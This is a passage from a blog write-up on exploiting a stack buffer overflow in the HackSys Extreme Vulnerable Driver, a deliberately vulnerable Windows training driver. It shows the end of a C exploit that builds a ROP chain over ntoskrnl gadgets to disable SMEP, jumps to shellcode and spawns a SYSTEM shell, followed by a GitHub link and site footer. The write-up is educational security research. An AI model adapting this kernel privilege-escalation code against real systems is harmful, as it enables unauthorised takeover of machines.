+<a id="__codelineno-11-90" name="__codelineno-11-90"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ShellcodeBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-91" name="__codelineno-11-91"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ShellcodeBase</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-92" name="__codelineno-11-92"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-93" name="__codelineno-11-93"></a>
+<a id="__codelineno-11-94" name="__codelineno-11-94"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-95" name="__codelineno-11-95"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-96" name="__codelineno-11-96"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">  </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-97" name="__codelineno-11-97"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">OldProtect</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-98" name="__codelineno-11-98"></a><span class="w">    </span><span class="kt">char</span><span class="w">    </span><span class="n">buffer</span><span class="p">[</span><span class="mi">2100</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-11-99" name="__codelineno-11-99"></a>
+<a id="__codelineno-11-100" name="__codelineno-11-100"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetKernelBase</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-11-101" name="__codelineno-11-101"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateShellcode</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-11-102" name="__codelineno-11-102"></a>
+<a id="__codelineno-11-103" name="__codelineno-11-103"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x6a0a51</span><span class="p">;</span><span class="w">   </span><span class="c1">// 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe</span>
+<a id="__codelineno-11-104" name="__codelineno-11-104"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x70678</span><span class="p">;</span><span class="w">                  </span><span class="c1">// Updated CR4</span>
+<a id="__codelineno-11-105" name="__codelineno-11-105"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ROP3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BaseAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x9a41e3</span><span class="p">;</span><span class="w">   </span><span class="c1">// 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe</span>
+<a id="__codelineno-11-106" name="__codelineno-11-106"></a>
+<a id="__codelineno-11-107" name="__codelineno-11-107"></a><span class="w">    </span><span class="cm">/* Fill exploit buffer with As. */</span><span class="w"></span>
+<a id="__codelineno-11-108" name="__codelineno-11-108"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-11-109" name="__codelineno-11-109"></a>
+<a id="__codelineno-11-110" name="__codelineno-11-110"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Beginning ROP chain to disable SMEP!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-111" name="__codelineno-11-111"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP1</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-112" name="__codelineno-11-112"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP2</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-113" name="__codelineno-11-113"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ROP3</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-114" name="__codelineno-11-114"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] SMEP should now be disabled!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-115" name="__codelineno-11-115"></a>
+<a id="__codelineno-11-116" name="__codelineno-11-116"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">2072</span><span class="o">+</span><span class="mi">24</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-117" name="__codelineno-11-117"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Executing shellcode!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-118" name="__codelineno-11-118"></a>
+<a id="__codelineno-11-119" name="__codelineno-11-119"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DRIVER</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-120" name="__codelineno-11-120"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-121" name="__codelineno-11-121"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span>
+<a id="__codelineno-11-122" name="__codelineno-11-122"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-123" name="__codelineno-11-123"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Could not open HEVD handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-124" name="__codelineno-11-124"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-125" name="__codelineno-11-125"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-126" name="__codelineno-11-126"></a>
+<a id="__codelineno-11-127" name="__codelineno-11-127"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
+<a id="__codelineno-11-128" name="__codelineno-11-128"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-129" name="__codelineno-11-129"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-130" name="__codelineno-11-130"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-131" name="__codelineno-11-131"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-132" name="__codelineno-11-132"></a>
+<a id="__codelineno-11-133" name="__codelineno-11-133"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-134" name="__codelineno-11-134"></a>
+<a id="__codelineno-11-135" name="__codelineno-11-135"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
+<a id="__codelineno-11-136" name="__codelineno-11-136"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-137" name="__codelineno-11-137"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Stack Buffer Overflow!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-138" name="__codelineno-11-138"></a><span class="w">    </span><span class="n">exploit</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-11-139" name="__codelineno-11-139"></a>
+<a id="__codelineno-11-140" name="__codelineno-11-140"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cmd.exe /c cmd.exe /K cd C:</span><span class="se">\\</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-141" name="__codelineno-11-141"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] 1337 System Shell Bozo&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-142" name="__codelineno-11-142"></a>
+<a id="__codelineno-11-143" name="__codelineno-11-143"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-144" name="__codelineno-11-144"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<p><a class="md-button md-button--primary" href="https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/StackOverflow64.c">Exploit on <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span> </a></p>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>In the future I will publish an article which explains that process in more detail. However in this example we're just going to use <code>EnumDeviceDrivers</code>.&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+  
+  
+
+
+
+
+  
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../../2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../2022-05-21-HEVD3-DoubleFetch/" class="md-footer__link md-footer__link--next" aria-label="Next: HackSys Extreme Vulnerable Driver 3 - Double Fetch" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              HackSys Extreme Vulnerable Driver 3 - Double Fetch
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs Insiders
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/linxzsec" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/linxzsec" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://gitlab.com/linxzsec" target="_blank" rel="noopener" title="gitlab.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="m503.5 204.6-.7-1.8-69.7-181.78c-1.4-3.57-3.9-6.59-7.2-8.64-2.4-1.55-5.1-2.515-8-2.81-2.9-.295-5.7.083-8.4 1.11-2.7 1.02-5.1 2.66-7.1 4.78-1.9 2.12-3.3 4.67-4.1 7.44l-47 144H160.8l-47.1-144c-.8-2.77-2.2-5.31-4.1-7.43-2-2.12-4.4-3.75-7.1-4.77a18.1 18.1 0 0 0-8.38-1.113 18.4 18.4 0 0 0-8.04 2.793 18.09 18.09 0 0 0-7.16 8.64L9.267 202.8l-.724 1.8a129.57 129.57 0 0 0-3.52 82c7.747 26.9 24.047 50.7 46.447 67.6l.27.2.59.4 105.97 79.5 52.6 39.7 32 24.2c3.7 1.9 8.3 4.3 13 4.3 4.7 0 9.3-2.4 13-4.3l32-24.2 52.6-39.7 106.7-79.9.3-.3c22.4-16.9 38.7-40.6 45.6-67.5 8.6-27 7.4-55.8-2.6-82z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://keybase.io/linxz" target="_blank" rel="noopener" title="keybase.io" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M286.17 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18zm111.92-147.6c-9.5-14.62-39.37-52.45-87.26-73.71q-9.1-4.06-18.38-7.27a78.43 78.43 0 0 0-47.88-104.13c-12.41-4.1-23.33-6-32.41-5.77-.6-2-1.89-11 9.4-35L198.66 32l-5.48 7.56c-8.69 12.06-16.92 23.55-24.34 34.89a51 51 0 0 0-8.29-1.25c-41.53-2.45-39-2.33-41.06-2.33-50.61 0-50.75 52.12-50.75 45.88l-2.36 36.68c-1.61 27 19.75 50.21 47.63 51.85l8.93.54a214 214 0 0 0-46.29 35.54C14 304.66 14 374 14 429.77v33.64l23.32-29.8a148.6 148.6 0 0 0 14.56 37.56c5.78 10.13 14.87 9.45 19.64 7.33 4.21-1.87 10-6.92 3.75-20.11a178.29 178.29 0 0 1-15.76-53.13l46.82-59.83-24.66 74.11c58.23-42.4 157.38-61.76 236.25-38.59 34.2 10.05 67.45.69 84.74-23.84.72-1 1.2-2.16 1.85-3.22a156.09 156.09 0 0 1 2.8 28.43c0 23.3-3.69 52.93-14.88 81.64-2.52 6.46 1.76 14.5 8.6 15.74 7.42 1.57 15.33-3.1 18.37-11.15C429 443 434 414 434 382.32c0-38.58-13-77.46-35.91-110.92zM142.37 128.58l-15.7-.93-1.39 21.79 13.13.78a93 93 0 0 0 .32 19.57l-22.38-1.34a12.28 12.28 0 0 1-11.76-12.79L107 119c1-12.17 13.87-11.27 13.26-11.32l29.11 1.73a144.35 144.35 0 0 0-7 19.17zm148.42 172.18a10.51 10.51 0 0 1-14.35-1.39l-9.68-11.49-34.42 27a8.09 8.09 0 0 1-11.13-1.08l-15.78-18.64a7.38 7.38 0 0 1 1.34-10.34l34.57-27.18-14.14-16.74-17.09 13.45a7.75 7.75 0 0 1-10.59-1s-3.72-4.42-3.8-4.53a7.38 7.38 0 0 1 1.37-10.34L214 225.19s-18.51-22-18.6-22.14a9.56 9.56 0 0 1 1.74-13.42 10.38 10.38 0 0 1 14.3 1.37l81.09 96.32a9.58 9.58 0 0 1-1.74 13.44zM187.44 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "search.suggest", "search.highlight", "navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.top", "content.code.annotate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.4a0e3b6c.min.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
